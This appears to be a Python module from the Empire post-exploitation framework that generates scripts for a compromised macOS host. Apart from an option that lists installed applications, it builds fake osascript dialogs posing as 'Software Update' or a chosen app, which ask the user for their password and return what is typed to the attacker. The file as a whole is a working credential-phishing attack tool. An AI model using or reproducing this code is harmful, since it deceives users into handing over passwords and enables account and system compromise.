from builtins import object
from typing import Dict, Tuple, Optional

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:

        listApps = params['ListApps']
        appName = params['AppName']
        sandboxMode = params['SandboxMode']
        if listApps != "":
            script = """
import os
apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
choices = []
for x in xrange(len(apps)):
    choices.append("[%s] %s " %(x+1, apps[x]) )

print("\\nAvailable applications:\\n")
print('\\n'.join(choices))
"""

        else:
            if sandboxMode != "":
                # osascript prompt for the current application with System Preferences icon
                script = """
import os
print(os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with hidden answer with title "Software Update"\\\'').read())
"""

            else:
                # osascript prompt for the specific application
                script = """
import os
print(os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read())
""" % (appName, appName, appName, appName)

        return script
